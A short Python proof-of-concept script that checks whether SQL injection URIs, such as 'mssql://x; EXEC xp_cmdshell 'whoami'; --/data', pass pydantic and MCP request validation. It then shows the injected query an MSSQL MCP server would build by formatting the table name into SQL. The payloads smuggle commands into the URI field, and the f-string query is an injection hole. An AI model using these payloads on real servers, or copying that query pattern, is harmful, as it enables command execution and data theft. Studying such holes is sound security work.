from pydantic import AnyUrl
from mcp.types import ReadResourceRequestParams

payloads = [
    "mssql://x; EXEC xp_cmdshell 'whoami'; --/data",
    "mssql://x;SELECT 1;--/data",
    "mssql://sys.tables;EXEC('whoami')--/data",
    "mssql://x%3B%20EXEC%20xp_cmdshell('whoami')%3B%20--/data",
]
for p in payloads:
    print("="*70)
    print("INPUT URI:", repr(p))
    # 1) Does AnyUrl accept it?
    try:
        u = AnyUrl(p)
        print(" AnyUrl OK ->", repr(str(u)))
    except Exception as e:
        print(" AnyUrl REJECT:", type(e).__name__, str(e)[:120])
        u = None
    # 2) Does the MCP request param model accept it?
    try:
        params = ReadResourceRequestParams(uri=p)
        uri_str = str(params.uri)
        print(" ReadResourceRequestParams OK -> uri_str =", repr(uri_str))
        # 3) Reproduce server parse (server.py lines 76-82)
        parts = uri_str[8:].split('/')
        table = parts[0]
        print(" PARSED table =", repr(table))
        print(" RESULTING SQL =", repr(f"SELECT TOP 100 * FROM {table}"))
    except Exception as e:
        print(" ReadResourceRequestParams REJECT:", type(e).__name__, str(e)[:120])
